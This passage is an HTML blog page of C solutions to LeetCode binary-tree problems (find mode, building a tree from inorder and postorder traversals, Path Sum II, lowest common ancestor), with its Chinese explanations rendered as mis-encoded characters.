class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> max;<span class="comment">//æ•°é‡æœ€å¤šçš„æ•°çš„æ•°é‡</span></span><br><span class="line"><span class="type">int</span> num;<span class="comment">//å‰ä¸€ç»“ç‚¹çš„è¿ç»­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line"><span class="type">int</span> pre;<span class="comment">//å‰ä¸€ç»“ç‚¹çš„å€¼</span></span><br><span class="line"><span class="type">int</span> size;<span class="comment">//è¿”å›çš„æ•°ç»„çš„å¤§å°</span></span><br><span class="line"><span class="type">int</span> *retn;<span class="comment">//è¿”å›çš„æ•°ç»„</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findMode</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    retn = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2150</span>);</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    max = <span class="number">0</span>;</span><br><span class="line">    pre = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = size;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode * root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == pre)</span><br><span class="line">        num++;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//æ–°åºåˆ—</span></span><br><span class="line">        num = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num &gt; max)<span class="comment">//ç›¸åŒç»“ç‚¹æ•°é‡æ¯”maxè¿˜å¤šï¼Œåˆ™è¿›è¡Œé‡ç½®</span></span><br><span class="line">    &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        retn[size++] = root-&gt;val;</span><br><span class="line">        max = num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == max)<span class="comment">//å¦åˆ™ï¼Œæ”¾å…¥æ•°ç»„ä¸­</span></span><br><span class="line">    &#123;</span><br><span class="line">        retn[size++] = root-&gt;val;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pre = root-&gt;val;<span class="comment">//å‚¨å­˜è¯¥ç»“ç‚¹å€¼ï¼Œç»§ç»­éå†ä¸‹ä¸€ç»“ç‚¹</span></span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/24/wxTxSA.png" alt="wxTxSA.png"></p><h3 id="25-106-ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆä¸­ç­‰ï¼‰"><a href="#25-106-ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="25 - 106. ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆä¸­ç­‰ï¼‰"></a>25 - <a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal/">106. ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>æ ¹æ®ä¸€æ£µæ ‘çš„ä¸­åºéå†ä¸ååºéå†æ„é€ äºŒå‰æ ‘ã€‚</p><p>æ³¨æ„:<br>ä½ å¯ä»¥å‡è®¾æ ‘ä¸­æ²¡æœ‰é‡å¤çš„å…ƒç´ ã€‚</p><p>ä¾‹å¦‚ï¼Œç»™å‡º</p><p>ä¸­åºéå† inorder &#x3D; [9,3,15,20,7]<br>ååºéå† postorder &#x3D; [9,15,7,20,3]<br>è¿”å›å¦‚ä¸‹çš„äºŒå‰æ ‘ï¼š</p><pre><code>    3/ \\</code></pre><p>   9  20<br>     &#x2F;  \<br>    15   7</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal">https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><del>ä¸€ä¸Šæ¥å°±æŠŠæˆ‘ç»™çœ‹æ‡µäº†ï¼ŒçœŸæœ‰ä½ çš„å•Šleetcode</del></p><h4 id="è§£æ³•ï¼šé€’å½’"><a href="#è§£æ³•ï¼šé€’å½’" class="headerlink" title="è§£æ³•ï¼šé€’å½’"></a>è§£æ³•ï¼šé€’å½’</h4><p>è¿™é“é¢˜ä¸»è¦çš„çªç ´ç‚¹æ˜¯<strong>ååºéå†æ‰€å¾—çš„æ•°ç»„</strong></p><p>ä¸­åºéå†çš„é¡ºåºæ˜¯ï¼š<strong>æ ¹-&gt;å·¦-&gt;å³</strong></p><p>ååºéå†çš„é¡ºåºæ˜¯ï¼š<strong>å·¦-&gt;å³-&gt;æ ¹</strong></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>ååºéå†çš„æœ€åä¸€ä¸ªç»“ç‚¹å¿…å®šæ˜¯è¿™ä¸€æ£µæ ‘çš„æ ¹ç»“ç‚¹ï¼Œè€Œä¸­åºéå†æ‰€å¾—çš„ç»“æœä¸­æ ¹ç»“ç‚¹çš„å·¦è¾¹æ‰€æœ‰ç»“ç‚¹å¿…å®šå±äºå·¦å­æ ‘ï¼Œå³è¾¹æ‰€æœ‰ç»“ç‚¹å¿…å®šå±äºå³å­æ ‘</strong></p><p><strong>åœ¨ååºåˆ—è¡¨ä¸­ï¼Œå‰leftä¸ªå€¼ä¸ºå·¦å­æ ‘ï¼Œleft+1åˆ°left+rightä¸ºå³å­æ ‘ï¼›</strong><br><strong>åœ¨ä¸­åºåˆ—è¡¨ä¸­ï¼Œæ ¹ç»“ç‚¹å‰ä¸ºå·¦å­æ ‘ï¼Œæ ¹ç»“ç‚¹åä¸ºå³å­æ ‘ï¼›</strong> </p><p>ä¾ç…§è¿™ä¸ªæ€§è´¨ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥<strong>æŒ‰ç…§ä¸­åºéå†çš„é¡ºåºé‡æ„è¿™ä¸€æ£µæ ‘</strong></p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>* inorder, <span class="type">int</span> inorderSize, <span class="type">int</span>* postorder, <span class="type">int</span> postorderSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!inorderSize || !postorderSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * <span class="title">node</span> =</span> (<span class="keyword">struct</span> TreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">    <span class="type">int</span> root = postorder[postorderSize<span class="number">-1</span>];</span><br><span class="line">    </span><br><span class="line">    node-&gt;val = root;</span><br><span class="line">    <span class="type">int</span> left;</span><br><span class="line">    <span class="keyword">for</span>(left = <span class="number">0</span>;left&lt;inorderSize;left++)</span><br><span class="line">        <span class="keyword">if</span>(inorder[left] == root)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> right = inorderSize - left - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    node-&gt;left = buildTree(inorder, left, postorder, left);</span><br><span class="line">    node-&gt;right = buildTree(inorder + left + <span class="number">1</span>, right, postorder + left, right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/25/sYMeb6NL3aSJxdC.png" alt="R8JMRM38V_UU7NZ_F0_6WO6.png"></p><h3 id="26-113-è·¯å¾„æ€»å’Œ-IIï¼ˆä¸­ç­‰ï¼‰"><a href="#26-113-è·¯å¾„æ€»å’Œ-IIï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="26 - 113. è·¯å¾„æ€»å’Œ IIï¼ˆä¸­ç­‰ï¼‰"></a>26 - <a href="https://leetcode-cn.com/problems/path-sum-ii/">113. è·¯å¾„æ€»å’Œ IIï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œä¸€ä¸ªç›®æ ‡å’Œï¼Œæ‰¾åˆ°æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹è·¯å¾„æ€»å’Œç­‰äºç»™å®šç›®æ ‡å’Œçš„è·¯å¾„ã€‚</p><p>è¯´æ˜: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹:<br>ç»™å®šå¦‚ä¸‹äºŒå‰æ ‘ï¼Œä»¥åŠç›®æ ‡å’Œ sum &#x3D; 22ï¼Œ</p><pre><code>          5         / \\        4   8       /   / \\      11  13  4     /  \\    / \\    7    2  5   1</code></pre><p>è¿”å›:</p><p>[<br>   [5,4,11,2],<br>   [5,8,4,5]<br>]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/path-sum-ii">https://leetcode-cn.com/problems/path-sum-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’ä¸­åºéå†"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-é€’å½’ä¸­åºéå†" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰+ é€’å½’ä¸­åºéå†"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰+ é€’å½’ä¸­åºéå†</h4><p>ä¸­åºéå†ï¼Œä¸€å±‚ä¸€å±‚åœ°æœä¸‹å»å°±å®Œäº‹äº†ï¼Œç”¨ä¸€ä¸ªæ ˆæ¥ä¿å­˜è·¯å¾„ï¼Œé‡åˆ°å¶å­ç»“ç‚¹ä¸”åˆšå¥½åˆ°äº†è¿™ä¸€å±‚æ—¶sumå·²ç»è¢«å‡åˆ°0äº†å°±ä¿å­˜è·¯å¾„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>åœ¨æ¯ä¸€å±‚æœç´¢ç»“æŸåéƒ½è¦å°†è¯¥å±‚ç»“ç‚¹å¼¹å‡ºæ ˆ</strong></p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an array of arrays of size *returnSize.</span></span><br><span class="line"><span class="comment"> * The sizes of the arrays are returned as *returnColumnSizes array.</span></span><br><span class="line"><span class="comment"> * Note: Both returned array and *columnSizes array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> **retn;</span><br><span class="line"><span class="type">int</span> *<span class="built_in">set</span>;</span><br><span class="line"><span class="type">int</span> nums;</span><br><span class="line"><span class="type">int</span> retn_nums;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> sum, <span class="type">int</span>** returnColumnSizes)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    sum -= root-&gt;val;</span><br><span class="line">    <span class="built_in">set</span>[nums++] = root-&gt;val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; !sum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> * path = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * nums);</span><br><span class="line">        <span class="built_in">memcpy</span>(path, <span class="built_in">set</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>) * nums);</span><br><span class="line">        (*returnColumnSizes)[retn_nums] = nums;</span><br><span class="line">        retn[retn_nums++] = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;left,sum,returnColumnSizes);</span><br><span class="line">    dfs(root-&gt;right,sum,returnColumnSizes);</span><br><span class="line">    nums--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>** <span class="title function_">pathSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> sum, <span class="type">int</span>* returnSize, <span class="type">int</span>** returnColumnSizes)</span></span><br><span class="line">&#123;</span><br><span class="line">    retn_nums = nums = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">set</span> = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    retn = (<span class="type">int</span>**)<span class="built_in">calloc</span>(<span class="number">1000</span>,<span class="keyword">sizeof</span>(<span class="type">int</span>*));</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        (*returnColumnSizes)[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root,sum,returnColumnSizes);</span><br><span class="line">    *returnSize = retn_nums;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/26/oqx2CRyb9JMavBZ.png" alt="image.png"></p><h3 id="27-235-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆç®€å•ï¼‰"><a href="#27-235-äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆç®€å•ï¼‰" class="headerlink" title="27 - 235. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆç®€å•ï¼‰"></a>27 - <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. äºŒå‰æœç´¢æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æœç´¢æ ‘, æ‰¾åˆ°è¯¥æ ‘ä¸­ä¸¤ä¸ªæŒ‡å®šèŠ‚ç‚¹çš„æœ€è¿‘å…¬å…±ç¥–å…ˆã€‚</p><p>ç™¾åº¦ç™¾ç§‘ä¸­æœ€è¿‘å…¬å…±ç¥–å…ˆçš„å®šä¹‰ä¸ºï¼šâ€œå¯¹äºæœ‰æ ¹æ ‘ T çš„ä¸¤ä¸ªç»“ç‚¹ pã€qï¼Œæœ€è¿‘å…¬å…±ç¥–å…ˆè¡¨ç¤ºä¸ºä¸€ä¸ªç»“ç‚¹ xï¼Œæ»¡è¶³ x æ˜¯ pã€q çš„ç¥–å…ˆä¸” x çš„æ·±åº¦å°½å¯èƒ½å¤§ï¼ˆä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿå¯ä»¥æ˜¯å®ƒè‡ªå·±çš„ç¥–å…ˆï¼‰ã€‚â€</p><p>ä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹äºŒå‰æœç´¢æ ‘:  root &#x3D; [6,2,8,0,4,7,9,null,null,3,5]</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 8<br>è¾“å‡º: 6<br>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 8 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 6ã€‚<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: root &#x3D; [6,2,8,0,4,7,9,null,null,3,5], p &#x3D; 2, q &#x3D; 4<br>è¾“å‡º: 2<br>è§£é‡Š: èŠ‚ç‚¹ 2 å’ŒèŠ‚ç‚¹ 4 çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ 2, å› ä¸ºæ ¹æ®å®šä¹‰æœ€è¿‘å…¬å…±ç¥–å…ˆèŠ‚ç‚¹å¯ä»¥ä¸ºèŠ‚ç‚¹æœ¬èº«ã€‚</p><p>è¯´æ˜:</p><p>æ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½æ˜¯å”¯ä¸€çš„ã€‚<br>pã€q ä¸ºä¸åŒèŠ‚ç‚¹ä¸”å‡å­˜åœ¨äºç»™å®šçš„äºŒå‰æœç´¢æ ‘ä¸­ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h4 id="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>è§£æ³•ï¼šæ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h4><p>äºŒå‰æœç´¢æ ‘ï¼ˆBSTï¼‰æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨å°±æ˜¯<strong>å·¦å­æ ‘æ‰€æœ‰ç»“ç‚¹éƒ½å°äºå½“å‰èŠ‚ç‚¹ï¼Œå³å­æ ‘æ‰€æœ‰ç»“ç‚¹éƒ½å¤§äºå½“å‰ç»“ç‚¹</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡æ¯”è¾ƒç»“ç‚¹çš„å€¼æ¥è¿›è¡Œåˆ¤æ–­</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> TreeNode* <span class="title function_">lowestCommonAncestor</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="keyword">struct</span> TreeNode* p, <span class="keyword">struct</span> TreeNode* q)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == q)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> flag1 = p-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="type">bool</span> flag2 = q-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(flag1 != flag2)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p == root || q == root)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag1)</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root-&gt;right,p,q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lowestCommonAncestor(root-&gt;left,p,q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/27/1sudkorBnCPqV5l.png" alt="@_I_39NAGH0__CROGOJD4XX.png"></p><blockquote><p>æ—©ç¡æ—©èµ·èº«ä½“å¥½ï¼ˆç¡®ä¿¡</p></blockquote><h3 id="28-117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-IIï¼ˆä¸­ç­‰ï¼‰"><a href="#28-117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-IIï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="28 - 117. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ IIï¼ˆä¸­ç­‰ï¼‰"></a>28 - <a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii/">117. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ IIï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚</p><p>è¿›é˜¶ï¼š</p><p>ä½ åªèƒ½ä½¿ç”¨å¸¸é‡çº§é¢å¤–ç©ºé—´ã€‚<br>ä½¿ç”¨é€’å½’è§£é¢˜ä¹Ÿç¬¦åˆè¦æ±‚ï¼Œæœ¬é¢˜ä¸­é€’å½’ç¨‹åºå ç”¨çš„æ ˆç©ºé—´ä¸ç®—åšé¢å¤–çš„ç©ºé—´å¤æ‚åº¦ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p><img 